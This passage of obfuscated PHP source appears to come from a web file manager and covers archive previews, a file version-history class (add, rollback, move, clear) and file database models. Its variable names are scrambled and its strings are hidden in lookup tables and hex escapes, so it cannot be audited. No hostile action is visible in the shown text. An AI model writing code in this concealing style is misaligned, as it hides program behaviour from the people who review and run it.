$“ìì®Ë∂[$ªÑ˛¨ë»[32]] : $ªÑ˛¨ë»[12]; KodArchive::filePreview($ê–˙˝ıå, $ÅªÖîËß, $É˘ ƒô⁄, $ú‹∂‚∂é); self::archiveExt(); die; } $€˜ë¬ÕÂ = KodArchive::listContent($ê–˙˝ıå); self::archiveExt(); del_dir($ö√µÀé˛); if (!$€˜ë¬ÕÂ[$ªÑ˛¨ë»[1165]]) { show_json($€˜ë¬ÕÂ[$ªÑ˛¨ë»[1167]], !1); } $´äÎóÁ∆ = json_encode($€˜ë¬ÕÂ[$ªÑ˛¨ë»[1167]]); self::setContent($Æõä’ΩÌ, $´äÎóÁ∆); if (count($€˜ë¬ÕÂ[$ªÑ˛¨ë»[1167]]) >= $Ï¶è‹ö§) { show_json(sprintf(LNG($ªÑ˛¨ë»[1171]), count($€˜ë¬ÕÂ[$ªÑ˛¨ë»[1167]])), !1); } return $€˜ë¬ÕÂ[$ªÑ˛¨ë»[1167]]; } private static function fileExt($≥º¶πîì) { $á∑ﬂüÁ∂ =& $_SERVER[ëæªã÷]; $‹≠‡Œõ = $≥º¶πîì[$á∑ﬂüÁ∂[177]]; if ($‹≠‡Œõ == $á∑ﬂüÁ∂[1174]) { $Í ñûìÙ = $á∑ﬂüÁ∂[1175]; if (substr($≥º¶πîì[$á∑ﬂüÁ∂[32]], -strlen($Í ñûìÙ)) == $Í ñûìÙ) { $‹≠‡Œõ = $á∑ﬂüÁ∂[1176]; } } self::archiveExt($‹≠‡Œõ); return $‹≠‡Œõ; } private static function zipFileList($∏õ¯ø°ô, $ï∆îõÎÃ = false) { $∂≥ô«„« =& $_SERVER[ëæªã÷]; $—ü⁄›Ãç = array(); foreach ($∏õ¯ø°ô as $¥ÎüÚç¿) { $Äò”∆¯˘ = $¥ÎüÚç¿[$∂≥ô«„«[88]]; if ($ï∆îõÎÃ) { $Äò”∆¯˘ = self::copy($¥ÎüÚç¿[$∂≥ô«„«[88]], $ï∆îõÎÃ, $∂≥ô«„«[798]); } else { $ﬂ¥áò¡ﬁ = self::init($¥ÎüÚç¿[$∂≥ô«„«[88]]); if ($ﬂ¥áò¡ﬁ->getType() == $∂≥ô«„«[117]) { $Äò”∆¯˘ = $ﬂ¥áò¡ﬁ->path; } } if ($Äò”∆¯˘ && self::local()->exist($Äò”∆¯˘)) { $—ü⁄›Ãç[$¥ÎüÚç¿[$∂≥ô«„«[88]]] = $Äò”∆¯˘; } } if (!empty($—ü⁄›Ãç)) { return array_values($—ü⁄›Ãç); } show_json(LNG($∂≥ô«„«[1140]), !1); } public static function tmpFileName($ƒﬁ‡ÍÑ†) { $•˚˜øπ£ =& $_SERVER[ëæªã÷]; $’∏áÊòû = array($ƒﬁ‡ÍÑ†[$•˚˜øπ£[32]], $ƒﬁ‡ÍÑ†[$•˚˜øπ£[88]], $ƒﬁ‡ÍÑ†[$•˚˜øπ£[90]], $ƒﬁ‡ÍÑ†[$•˚˜øπ£[521]]); return md5(implode($•˚˜øπ£[11], $’∏áÊòû)); } private static function localFilePath($¯¬èÖﬁ¿, $ÈŒ§ÄòÚ) { $©âÕ¨¡˝ =& $_SERVER[ëæªã÷]; if ($ÈŒ§ÄòÚ == $©âÕ¨¡˝[1177] && strtoupper(substr(PHP_OS, 0, 3)) == $©âÕ¨¡˝[1178]) { return !1; } $ºë∏≥¥œ = KodIO::parse($¯¬èÖﬁ¿); if ($ºë∏≥¥œ[$©âÕ¨¡˝[33]] == KodIO::KOD_SOURCE) { $¡Ω§Â˘ƒ = Model($©âÕ¨¡˝[805])->fileInfoGet(KodIO::sourceID($¯¬èÖﬁ¿)); if (!$¡Ω§Â˘ƒ[$©âÕ¨¡˝[88]]) { show_json($©âÕ¨¡˝[1179], !1); } $¯¬èÖﬁ¿ = $¡Ω§Â˘ƒ[$©âÕ¨¡˝[88]]; } $—ÈœÉö = self::init($¯¬èÖﬁ¿); if ($—ÈœÉö->pathParse[$©âÕ¨¡˝[1127]]) { $¯¬èÖﬁ¿ = $—ÈœÉö->pathParse[$©âÕ¨¡˝[1127]]; $—ÈœÉö = self::init($¯¬èÖﬁ¿); } $åø±Ö‚ï = $—ÈœÉö->getType(); if ($åø±Ö‚ï == $©âÕ¨¡˝[117] || $åø±Ö‚ï == $©âÕ¨¡˝[1180]) { if (!$—ÈœÉö->exist($—ÈœÉö->path)) { show_json(LNG($©âÕ¨¡˝[116]), !1); } return $—ÈœÉö->path; } return !1; } private static function archiveExt($Áì˝Õ∂∑ = '') { $GLOBALS[$_SERVER[ëæªã÷][1181]] = $Áì˝Õ∂∑; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Ëñ´⁄Öï =& $_SERVER[ëæªã÷]; $≠ôµ¯ˆá = $GLOBALS[$Ëñ´⁄Öï[6]][$Ëñ´⁄Öï[100]]; if ($≠ôµ¯ˆá[$Ëñ´⁄Öï[1182]] != 1) { return; } if ($≠ôµ¯ˆá[$Ëñ´⁄Öï[1183]] <= 0) { return; } if (isset($_REQUEST[$Ëñ´⁄Öï[1184]]) && $_REQUEST[$Ëñ´⁄Öï[1184]] == $Ëñ´⁄Öï[99]) { return; } Hook::bind($Ëñ´⁄Öï[1185], $Ëñ´⁄Öï[1186]); Hook::bind($Ëñ´⁄Öï[1187], $Ëñ´⁄Öï[1188]); Hook::bind($Ëñ´⁄Öï[1189], $Ëñ´⁄Öï[1190]); Hook::bind($Ëñ´⁄Öï[1191], $Ëñ´⁄Öï[1192]); Hook::bind($Ëñ´⁄Öï[1193], $Ëñ´⁄Öï[1194]); Hook::bind($Ëñ´⁄Öï[1195], $Ëñ´⁄Öï[1196]); } public static function eventBeforeUpload($Ü±ÊÌôä) { if ($Ü±ÊÌôä[3] && $Ü±ÊÌôä[3] != REPEAT_REPLACE) { return; } $¨˝ó ∞˘ = self::parsePath($Ü±ÊÌôä[0]); if (!$¨˝ó ∞˘) { return; } self::add($¨˝ó ∞˘); } public static function eventBeforeEdit($√ó›ïËá) { $Î¨Ù≠´á = self::parsePath($√ó›ïËá[0]); if (!$Î¨Ù≠´á) { return; } self::add($Î¨Ù≠´á); } public static function eventBeforeCopyFile($Ä√∞ÄÓ•, $Ë∫˛àπÅ, $ë’Ù˝±›, $ù∫ôå¬÷, $ìáÄËî∏, $∑◊á˝¸∏) { $œ˘≥ﬂÃ¶ = $ë’Ù˝±›->getPathOuter($ù∫ôå¬÷); $ÓÃ¡„ıú = self::parsePath($œ˘≥ﬂÃ¶); if (!$ÓÃ¡„ıú) { return; } self::add($ÓÃ¡„ıú); } public static function eventBeforeRename($„ûﬂ–›ˆ) { $ªÅæ⁄áË =& $_SERVER[ëæªã÷]; $˜°¸ˆπØ = self::parsePath($„ûﬂ–›ˆ[0]); if (!$˜°¸ˆπØ) { return; } $çò…æ£Ì = self::checkInHistory($˜°¸ˆπØ); if (!$çò…æ£Ì) { return; } if ($çò…æ£Ì[$ªÅæ⁄áË[33]] == $ªÅæ⁄áË[202]) { $Òü√ß≠Ù = self::listData($˜°¸ˆπØ); if ($Òü√ß≠Ù && $Òü√ß≠Ù[$ªÅæ⁄áË[373]]) { self::moveHistory($˜°¸ˆπØ, $„ûﬂ–›ˆ[1]); } } else { IO::rename($çò…æ£Ì[$ªÅæ⁄áË[88]], $„ûﬂ–›ˆ[1]); } } public static function eventBeforeMove($Ù˜‡Õﬂú) { $Ñ‰ñŒÂµ =& $_SERVER[ëæªã÷]; $æùöºì¯ = self::parsePath($Ù˜‡Õﬂú[0]); if (!$æùöºì¯) { return; } $˛Õ±›¡ä = self::parsePath($Ù˜‡Õﬂú[1]); if (!$˛Õ±›¡ä) { return; } $æÉ–ô¿¨ = $Ù˜‡Õﬂú[3]; $ÉìÄÛ”Á = self::checkInHistory($æùöºì¯); if (!$ÉìÄÛ”Á) { return; } $˝˝˛∑‰Ä = self::pathHistory($˛Õ±›¡ä); if ($ÉìÄÛ”Á[$Ñ‰ñŒÂµ[33]] == $Ñ‰ñŒÂµ[202]) { $˚˘∂≠ë◊ = self::listData($æùöºì¯); $⁄‹˘∞ºÁ = rtrim($˛Õ±›¡ä, $Ñ‰ñŒÂµ[8]) . $Ñ‰ñŒÂµ[8] . ($æÉ–ô¿¨ ? $æÉ–ô¿¨ : get_path_this($æùöºì¯)); $À¡ÔÀ∞∏ = self::listData($⁄‹˘∞ºÁ); if ($˚˘∂≠ë◊ && $˚˘∂≠ë◊[$Ñ‰ñŒÂµ[373]] && $À¡ÔÀ∞∏ && $À¡ÔÀ∞∏[$Ñ‰ñŒÂµ[373]]) { return self::clear($æùöºì¯); } if ($˚˘∂≠ë◊ && $˚˘∂≠ë◊[$Ñ‰ñŒÂµ[373]]) { self::moveHistory($æùöºì¯, $æÉ–ô¿¨, $˝˝˛∑‰Ä); } } else { IO::move($ÉìÄÛ”Á[$Ñ‰ñŒÂµ[88]], $˝˝˛∑‰Ä, !1, $æÉ–ô¿¨); self::clearEmptyFolder(IO::pathFather($ÉìÄÛ”Á[$Ñ‰ñŒÂµ[88]])); } } public static function eventAfterRemove($’µÿõÂ˜, $ùÖ‰û˝∂) { $Ôã¬ñ´ò =& $_SERVER[ëæªã÷]; if (!$ùÖ‰û˝∂) { return; } $ë·ºö˘î = self::parsePath($’µÿõÂ˜[0]); if (!$ë·ºö˘î) { return; } $’ΩÙ°∆µ = self::checkInHistory($ë·ºö˘î); if (!$’ΩÙ°∆µ) { return; } if ($’ΩÙ°∆µ[$Ôã¬ñ´ò[33]] == $Ôã¬ñ´ò[202]) { $»Á¿€œ” = self::listData($ë·ºö˘î, !1); if ($»Á¿€œ” && $»Á¿€œ”[$Ôã¬ñ´ò[373]]) { self::clear($ë·ºö˘î, !1); } } else { IO::remove($’ΩÙ°∆µ[$Ôã¬ñ´ò[88]]); self::clearEmptyFolder(IO::pathFather($’ΩÙ°∆µ[$Ôã¬ñ´ò[88]])); } } private static function checkInHistory($ö≤µ–£·) { $àÅ˘√¯‡ = self::pathHistory($ö≤µ–£·); if (!IO::exist($àÅ˘√¯‡)) { $àÅ˘√¯‡ .= $_SERVER[ëæªã÷][1197]; } return IO::exist($àÅ˘√¯‡) ? IO::info($àÅ˘√¯‡) : !1; } private static function parsePath($ãË¨ã⁄ñ) { $‡˝ ı⁄Ü =& $_SERVER[ëæªã÷]; if (!$ãË¨ã⁄ñ) { return !1; } if ($GLOBALS[$‡˝ ı⁄Ü[1198]]) { return; } $π‹¸Ô›ä = KodIO::parse($ãË¨ã⁄ñ); $∏¥¸Ä’Ÿ = $π‹¸Ô›ä[$‡˝ ı⁄Ü[33]]; $àﬂµ´¯£ = !$∏¥¸Ä’Ÿ || $∏¥¸Ä’Ÿ == KodIO::KOD_IO || $∏¥¸Ä’Ÿ == KodIO::KOD_SHARE_ITEM; if (!$àﬂµ´¯£ || !$π‹¸Ô›ä[$‡˝ ı⁄Ü[1199]]) { return !1; } if (substr($ãË¨ã⁄ñ, 0, strlen(DATA_PATH . $‡˝ ı⁄Ü[1200])) == DATA_PATH . $‡˝ ı⁄Ü[1200]) { return !1; } if ($∏¥¸Ä’Ÿ == KodIO::KOD_SHARE_ITEM) { $º¿Ñ —˝ = IO::init($ãË¨ã⁄ñ); if ($º¿Ñ —˝->pathParse[$‡˝ ı⁄Ü[1127]]) { return self::parsePath($º¿Ñ —˝->pathParse[$‡˝ ı⁄Ü[1127]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ºÀÊ•¡© = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $‡˝ ı⁄Ü[1201]); foreach ($ºÀÊ•¡© as $ùΩÏÕª◊) { if (!$∏¥¸Ä’Ÿ && substr($ãË¨ã⁄ñ, 0, strlen($ùΩÏÕª◊)) == $ùΩÏÕª◊) { return !1; } } self::log($GLOBALS[$‡˝ ı⁄Ü[1122]] . $‡˝ ı⁄Ü[1202] . $ãË¨ã⁄ñ); return $ãË¨ã⁄ñ; } private static function pathHistory($◊£ç¯£º) { $ÔÀ¡¥à≤ =& $_SERVER[ëæªã÷]; $∂„˘Ä≈€ = self::$_historyBase . ltrim(KodIO::clear($◊£ç¯£º), $ÔÀ¡¥à≤[8]); $∂„˘Ä≈€ = str_replace(array($ÔÀ¡¥à≤[1203]), array($ÔÀ¡¥à≤[1204]), $∂„˘Ä≈€); return $∂„˘Ä≈€; } public static function log($éÁ˚Œ∆Ÿ) { } public static function historyCount($Í¶Ñ÷∑ú) { $‹±· «® =& $_SERVER[ëæªã÷]; $”§ø‹œœ = array(); $Ìï˝˘˘ë = array(); foreach ($Í¶Ñ÷∑ú as $ ØÙôÙΩ) { $≥’ÇÓŒ÷ = get_path_father($ ØÙôÙΩ); if (!$Ìï˝˘˘ë[$≥’ÇÓŒ÷]) { $Ìï˝˘˘ë[$≥’ÇÓŒ÷] = array(); } $Ìï˝˘˘ë[$≥’ÇÓŒ÷][] = get_path_this($ ØÙôÙΩ); } foreach ($Ìï˝˘˘ë as $≥’ÇÓŒ÷ => $Õ⁄∞∂ƒì) { $éÅ≤åœñ = self::parsePath($≥’ÇÓŒ÷); if (!$éÅ≤åœñ) { continue; } foreach ($Õ⁄∞∂ƒì as $ÔﬁπÄ±ö) { $·¿Ã·˚° = self::listData(rtrim($éÅ≤åœñ, $‹±· «®[8]) . $‹±· «®[8] . $ÔﬁπÄ±ö, !1); if ($·¿Ã·˚° && $·¿Ã·˚°[$‹±· «®[373]]) { $”§ø‹œœ[rtrim($≥’ÇÓŒ÷, $‹±· «®[8]) . $‹±· «®[8] . $ÔﬁπÄ±ö] = count($·¿Ã·˚°[$‹±· «®[373]]); } } } return $”§ø‹œœ; } public static function add($èœ˚˝Ï¢) { $ÿÙ êá· =& $_SERVER[ëæªã÷]; $°ﬂúÆ≤ˆ = self::listData($èœ˚˝Ï¢); if (!$°ﬂúÆ≤ˆ) { return; } $∑¯É≤çñ = Model($ÿÙ êá·[750])->get($ÿÙ êá·[1205]); $§ëò”õ• = $GLOBALS[$ÿÙ êá·[6]][$ÿÙ êá·[100]][$ÿÙ êá·[1183]]; $˘˚ô¢ÜŸ = $∑¯É≤çñ == $ÿÙ êá·[1206] ? 5 : $§ëò”õ•; if ($§ëò”õ• <= 0) { return; } $◊Ï»ÇËµ = IO::hashSimple($èœ˚˝Ï¢); $œ∫≈∑ÿ˜ = IO::info($èœ˚˝Ï¢); $÷É∑Õ≠“ = $°ﬂúÆ≤ˆ[$ÿÙ êá·[373]]; if ($œ∫≈∑ÿ˜[$ÿÙ êá·[90]] == 0) { return; } if ($œ∫≈∑ÿ˜[$ÿÙ êá·[90]] >= 1024 * 1024 * 500) { return !1; } if ($÷É∑Õ≠“ && $÷É∑Õ≠“[0][$ÿÙ êá·[180]] == $◊Ï»ÇËµ) { return !0; } if (array_key_exists($ÿÙ êá·[205], $œ∫≈∑ÿ˜) && !$œ∫≈∑ÿ˜[$ÿÙ êá·[205]]) { return !1; } $ıèÀı⁄Ú = short_id(time()); $˙•ŒΩœÙ = array($ÿÙ êá·[401] => $ıèÀı⁄Ú, $ÿÙ êá·[180] => $◊Ï»ÇËµ, $ÿÙ êá·[32] => $œ∫≈∑ÿ˜[$ÿÙ êá·[32]] . $ÿÙ êá·[10] . date($ÿÙ êá·[1207]) . rand_string(1), $ÿÙ êá·[90] => $œ∫≈∑ÿ˜[$ÿÙ êá·[90]], $ÿÙ êá·[452] => USER_ID, $ÿÙ êá·[203] => time(), $ÿÙ êá·[1208] => $ÿÙ êá·[12]); IO::mkdir($°ﬂúÆ≤ˆ[$ÿÙ êá·[1209]]); $ü—ëë·‘ = IO::copy($èœ˚˝Ï¢, $°ﬂúÆ≤ˆ[$ÿÙ êá·[1209]], !1, $˙•ŒΩœÙ[$ÿÙ êá·[32]]); if (!$ü—ëë·‘) { self::clearEmptyFolder($°ﬂúÆ≤ˆ[$ÿÙ êá·[1209]]); return !1; } array_unshift($÷É∑Õ≠“, $˙•ŒΩœÙ); if (count($÷É∑Õ≠“) > $˘˚ô¢ÜŸ) { $ãœÖ‚∞› = array_slice($÷É∑Õ≠“, $˘˚ô¢ÜŸ); foreach ($ãœÖ‚∞› as $¶≈∫ï‡€) { IO::remove($°ﬂúÆ≤ˆ[$ÿÙ êá·[1209]] . $¶≈∫ï‡€[$ÿÙ êá·[32]]); } $÷É∑Õ≠“ = array_slice($÷É∑Õ≠“, 0, $˘˚ô¢ÜŸ); } return self::saveData($°ﬂúÆ≤ˆ[$ÿÙ êá·[1210]], $÷É∑Õ≠“); } public static function remove($ú÷»ÕáΩ, $ÆÔú∫»„) { $È°Ç…ﬁ» =& $_SERVER[ëæªã÷]; $˛ä‹å≥Ã = self::listData($ú÷»ÕáΩ); $•ÙµÎñ∫ = array(); if (!$˛ä‹å≥Ã) { return !1; } foreach ($˛ä‹å≥Ã[$È°Ç…ﬁ»[373]] as $…Ë‡⁄¥≤) { if ($…Ë‡⁄¥≤[$È°Ç…ﬁ»[401]] == $ÆÔú∫»„) { IO::remove($˛ä‹å≥Ã[$È°Ç…ﬁ»[1209]] . $…Ë‡⁄¥≤[$È°Ç…ﬁ»[32]]); continue; } $•ÙµÎñ∫[] = $…Ë‡⁄¥≤; } return self::saveData($˛ä‹å≥Ã[$È°Ç…ﬁ»[1210]], $•ÙµÎñ∫); } public static function clear($—±Ê›Ôî, $ﬁóä›–¯ = true) { $¡◊´ñ´á =& $_SERVER[ëæªã÷]; $≤≈œŒﬂı = self::listData($—±Ê›Ôî, $ﬁóä›–¯); if (!$≤≈œŒﬂı) { return !1; } foreach ($≤≈œŒﬂı[$¡◊´ñ´á[373]] as $ÖÓÕüÖ) { IO::remove($≤≈œŒﬂı[$¡◊´ñ´á[1209]] . $ÖÓÕüÖ[$¡◊´ñ´á[32]]); } return self::saveData($≤≈œŒﬂı[$¡◊´ñ´á[1210]], array()); } public static function moveHistory($àòÒÜÔ¨, $öƒ§ƒ‘∂ = '', $ò¢ÙÉ¬Í = '') { $ÔÕåÃ„≥ =& $_SERVER[ëæªã÷]; $£ˆÄñ‰ô = self::listData($àòÒÜÔ¨, !1); if (!$£ˆÄñ‰ô || !$£ˆÄñ‰ô[$ÔÕåÃ„≥[373]]) { return !1; } $©∞Ω‚ â = $ÔÕåÃ„≥[1197]; $öƒ§ƒ‘∂ = $öƒ§ƒ‘∂ ? $öƒ§ƒ‘∂ : get_path_this($àòÒÜÔ¨); $ò¢ÙÉ¬Í = $ò¢ÙÉ¬Í ? $ò¢ÙÉ¬Í : $£ˆÄñ‰ô[$ÔÕåÃ„≥[1209]]; $Ü—Ä£‡∆ = substr(get_path_this($£ˆÄñ‰ô[$ÔÕåÃ„≥[1210]]), 0, -strlen($©∞Ω‚ â)); foreach ($£ˆÄñ‰ô[$ÔÕåÃ„≥[373]] as $ú∏‚⁄Ìî => $úı»®Û∆) { $‡íÓ—Ÿ« = $öƒ§ƒ‘∂ . substr($úı»®Û∆[$ÔÕåÃ„≥[32]], strlen($Ü—Ä£‡∆)); $∆É›§∑‰ = IO::move($£ˆÄñ‰ô[$ÔÕåÃ„≥[1209]] . $úı»®Û∆[$ÔÕåÃ„≥[32]], $ò¢ÙÉ¬Í, !1, $‡íÓ—Ÿ«); if ($∆É›§∑‰) { $£ˆÄñ‰ô[$ÔÕåÃ„≥[373]][$ú∏‚⁄Ìî][$ÔÕåÃ„≥[32]] = $‡íÓ—Ÿ«; } } $£ˆÄñ‰ô[$ÔÕåÃ„≥[1210]] = IO::move($£ˆÄñ‰ô[$ÔÕåÃ„≥[1210]], $ò¢ÙÉ¬Í, !1, $öƒ§ƒ‘∂ . $©∞Ω‚ â); self::saveData($£ˆÄñ‰ô[$ÔÕåÃ„≥[1210]], $£ˆÄñ‰ô[$ÔÕåÃ„≥[373]]); self::clearEmptyFolder($£ˆÄñ‰ô[$ÔÕåÃ„≥[1209]]); } public static function rollback($Á˛Ü∏‡í, $…ïåØﬁå) { $Ÿ≤“é€Û =& $_SERVER[ëæªã÷]; $ Ω–ˆäÃ = self::listData($Á˛Ü∏‡í); if (!$ Ω–ˆäÃ) { return; } $¡Ú≈ŸÖÇ = IO::info($Á˛Ü∏‡í); foreach ($ Ω–ˆäÃ[$Ÿ≤“é€Û[373]] as $Ó†À⁄ë∆ => $¬ò¨âÕõ) { if ($¬ò¨âÕõ[$Ÿ≤“é€Û[401]] == $…ïåØﬁå) { self::add($Á˛Ü∏‡í); $ÂæÉä—ü = $ Ω–ˆäÃ[$Ÿ≤“é€Û[1209]] . $¬ò¨âÕõ[$Ÿ≤“é€Û[32]]; $ãÁ∑„Çë = IO::copy($ÂæÉä—ü, IO::pathFather($Á˛Ü∏‡í), REPEAT_REPLACE, $¡Ú≈ŸÖÇ[$Ÿ≤“é€Û[32]]); if ($ãÁ∑„Çë) { self::remove($Á˛Ü∏‡í, $…ïåØﬁå); } return $ãÁ∑„Çë; } } return !1; } public static function setDetail($‚‰Û‹ﬁì, $∑É·Ÿöø, $ËÈàéÜÏ) { $£«∞˙µ¿ =& $_SERVER[ëæªã÷]; $∆≈¶¬©Ì = self::listData($‚‰Û‹ﬁì); if (!$∆≈¶¬©Ì) { return; } foreach ($∆≈¶¬©Ì[$£«∞˙µ¿[373]] as $æ…ıºãÖ => $‡≤Ö‡ò©) { if ($‡≤Ö‡ò©[$£«∞˙µ¿[401]] == $∑É·Ÿöø) { $∆≈¶¬©Ì[$£«∞˙µ¿[373]][$æ…ıºãÖ][$£«∞˙µ¿[1208]] = $ËÈàéÜÏ; self::saveData($∆≈¶¬©Ì[$£«∞˙µ¿[1210]], $∆≈¶¬©Ì[$£«∞˙µ¿[373]]); return !0; } } return !1; } public static function fileInfo($Ø∆⁄µêƒ, $”â˝¢ÙÕ) { $Øª…≠˘§ =& $_SERVER[ëæªã÷]; $§ùƒ†‚„ = self::listData($Ø∆⁄µêƒ); if (!$§ùƒ†‚„) { show_json(LNG($Øª…≠˘§[116]), !1); } $æ®ÿìÛõ = $Øª…≠˘§[12]; foreach ($§ùƒ†‚„[$Øª…≠˘§[373]] as $¿Æ´—«˛ => $çØÚù—≠) { if ($çØÚù—≠[$Øª…≠˘§[401]] != $”â˝¢ÙÕ) { continue; } $æ®ÿìÛõ = $§ùƒ†‚„[$Øª…≠˘§[1209]] . $çØÚù—≠[$Øª…≠˘§[32]]; break; } if (!$æ®ÿìÛõ) { show_json(LNG($Øª…≠˘§[116]), !1); } return IO::info($æ®ÿìÛõ); } public static function fileOut($∏◊å¡Ω¡, $≤Öú©öÛ, $ÙÍ§ÛÇí = false) { $∂ƒﬂÇØí =& $_SERVER[ëæªã÷]; $´˜ä˙…® = self::fileInfo($∏◊å¡Ω¡, $≤Öú©öÛ); $±îá”¬ø =& $GLOBALS[$∂ƒﬂÇØí[7]]; $ÙÍ§ÛÇí = isset($±îá”¬ø[$∂ƒﬂÇØí[1173]]) && $±îá”¬ø[$∂ƒﬂÇØí[1173]] == 1; if (isset($±îá”¬ø[$∂ƒﬂÇØí[33]]) && $±îá”¬ø[$∂ƒﬂÇØí[33]] == $∂ƒﬂÇØí[1211]) { return IO::fileOutImage($´˜ä˙…®[$∂ƒﬂÇØí[88]], $±îá”¬ø[$∂ƒﬂÇØí[1212]]); } IO::fileOut($´˜ä˙…®[$∂ƒﬂÇØí[88]], $ÙÍ§ÛÇí, get_path_this($∏◊å¡Ω¡)); } public static function listData($éÿŒ˝†¢, $ÄËè„á¶ = true) { $öª˜£‚ç =& $_SERVER[ëæªã÷]; if ($ÄËè„á¶ && !IO::exist($éÿŒ˝†¢)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($éÿŒ˝†¢, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $çÒŒ¡√ı = self::pathHistory($éÿŒ˝†¢); $ØÍîã’€ = array($öª˜£‚ç[1210] => $çÒŒ¡√ı . $öª˜£‚ç[1197], $öª˜£‚ç[1209] => rtrim(get_path_father($çÒŒ¡√ı), $öª˜£‚ç[8]) . $öª˜£‚ç[8], $öª˜£‚ç[373] => array()); $¬Äå«–Ó = IO::getContent($ØÍîã’€[$öª˜£‚ç[1210]]); if ($¬Äå«–Ó) { $ÙﬁÍ˚∆Ô = json_decode($¬Äå«–Ó, !0); if (is_array($ÙﬁÍ˚∆Ô)) { $ØÍîã’€[$öª˜£‚ç[373]] = $ÙﬁÍ˚∆Ô; } } return $ØÍîã’€; } private static function saveData($ª∞∑´˝ÿ, $„¸æ∞ôû) { $Àó™°á˙ =& $_SERVER[ëæªã÷]; self::log($Àó™°á˙[1213] . $ª∞∑´˝ÿ . $Àó™°á˙[81] . count($„¸æ∞ôû), $Àó™°á˙[732]); if ($„¸æ∞ôû) { return IO::setContent($ª∞∑´˝ÿ, json_encode($„¸æ∞ôû)); } $œ˛†›£€ = IO::pathFather($ª∞∑´˝ÿ); IO::remove($ª∞∑´˝ÿ); self::clearEmptyFolder($œ˛†›£€); return !0; } public static function clearEmptyFolder($ëÀ˝‡èè) { $öè‡úÓ¢ =& $_SERVER[ëæªã÷]; if (trim($ëÀ˝‡èè, $öè‡úÓ¢[8]) == trim(self::$_historyBase, $öè‡úÓ¢[8])) { return; } $⁄˘ûïÃî = IO::pathFather($ëÀ˝‡èè); $¿ë¯´°Ê = IO::has($ëÀ˝‡èè, !0); if ($¿ë¯´°Ê[$öè‡úÓ¢[212]] > 0 || $¿ë¯´°Ê[$öè‡úÓ¢[213]] > 0) { return; } IO::remove($ëÀ˝‡èè); self::clearEmptyFolder($⁄˘ûïÃî); } private static function getBasePath() { $˘ò÷∫ù€ =& $_SERVER[ëæªã÷]; $Æ¥ÈÇäû = Model($˘ò÷∫ù€[1214])->get($˘ò÷∫ù€[1215]); if ($Æ¥ÈÇäû) { if (!IO::exist($Æ¥ÈÇäû)) { IO::mkdir($Æ¥ÈÇäû); } if (get_path_this($Æ¥ÈÇäû) == $˘ò÷∫ù€[1200]) { $πîÄª∞± = $˘ò÷∫ù€[1216] . rand_string(8); @rename($Æ¥ÈÇäû, get_path_father($Æ¥ÈÇäû) . $˘ò÷∫ù€[8] . $πîÄª∞±); $Æ¥ÈÇäû = DATA_PATH . $πîÄª∞± . $˘ò÷∫ù€[8]; file_put_contents(DATA_PATH . $˘ò÷∫ù€[1217], $˘ò÷∫ù€[12]); Model($˘ò÷∫ù€[1214])->set($˘ò÷∫ù€[1215], $Æ¥ÈÇäû); } return $Æ¥ÈÇäû; } $Æ¥ÈÇäû = DATA_PATH . $˘ò÷∫ù€[1216] . rand_string(8) . $˘ò÷∫ù€[8]; $Æ¥ÈÇäû = IO::mkdir($Æ¥ÈÇäû); $Æ¥ÈÇäû = rtrim($Æ¥ÈÇäû, $˘ò÷∫ù€[8]) . $˘ò÷∫ù€[8]; file_put_contents($Æ¥ÈÇäû . $˘ò÷∫ù€[1217], $˘ò÷∫ù€[12]); file_put_contents(DATA_PATH . $˘ò÷∫ù€[1217], $˘ò÷∫ù€[12]); Model($˘ò÷∫ù€[1214])->set($˘ò÷∫ù€[1215], $Æ¥ÈÇäû); return $Æ¥ÈÇäû; } } goto C∑Ç˜Ë¶¢„; F≠©üﬁüæÂ: class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\154\x65\x5f\143\157\x6e\x74\145\x6e\164\163"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\x65\x54\x69\x6d\x65", "\164\x69\x6d\x65", "\x69\156\x73\x65\162\164", "\146\x75\x6e\x63\164\151\157\x6e")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\151\154\x65"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\141\x6d\145" => "\151\157\137\x66\x69\x6c\x65\137\155\145\164\x61", "\x6d\x65\164\x61\x46\x69\x65\x6c\x64" => "\x66\x69\x6c\x65\x49\x44"); public function fileInfo($ˆŒŸùÊÂ) { $ƒ‚Åå’… =& $_SERVER[ëæªã÷]; static $ı”ò©› = array(); if (!isset($ı”ò©›[$ˆŒŸùÊÂ])) { $‘˝ÅúØ£ = $ƒ‚Åå’…[1844]; $àø ÜπË = Model($ƒ‚Åå’…[470])->field($‘˝ÅúØ£)->where(array($ƒ‚Åå’…[468] => $ˆŒŸùÊÂ))->find(); $ı”ò©›[$ˆŒŸùÊÂ] = $àø ÜπË; } return $ı”ò©›[$ˆŒŸùÊÂ]; } public function addFileByContent($¬Ô«√ÌÛ = '', $í‹åñÍ = '') { $ø…Ãú£° =& $_SERVER[ëæªã÷]; $¶Ò´Å©ı = TEMP_PATH . $ø…Ãú£°[1845]; if (!is_dir($¶Ò´Å©ı)) { mk_dir($¶Ò´Å©ı); } $•ÆùÌåÆ = $¶Ò´Å©ı . $ø…Ãú£°[1846] . rand_string(16); file_put_contents($•ÆùÌåÆ, $¬Ô«√ÌÛ); $ÓïµóÉü = $this->addFile($•ÆùÌåÆ, $í‹åñÍ, !0); if (file_exists($•ÆùÌåÆ)) { @unlink($•ÆùÌåÆ); } return $ÓïµóÉü; } public function createFileName($Ô°≈”©”, $†ﬂò¢±  = false, $∆ÔÇÅß” = false) { $öÀÃ›ìÅ =& $_SERVER[ëæªã÷]; $øı⁄Û◊Æ = IO::init($öÀÃ›ìÅ[8]); $∑—‰—Ò  = $this->makeFilePath($Ô°≈”©”, $øı⁄Û◊Æ, $†ﬂò¢± , $∆ÔÇÅß”); $ﬂ˜‡§Õã = $øı⁄Û◊Æ->pathFather($∑—‰—Ò ); static $ ˘ê“ù· = false; $ß˜ê¿∫á = $öÀÃ›ìÅ[1847] . md5($ﬂ˜‡§Õã); if (!$ ˘ê“ù· && !Cache::get($ß˜ê¿∫á)) { $ ˘ê“ù· = !0; $ÜâÆ÷Ö¥ = IO::mkdir($ﬂ˜‡§Õã); if 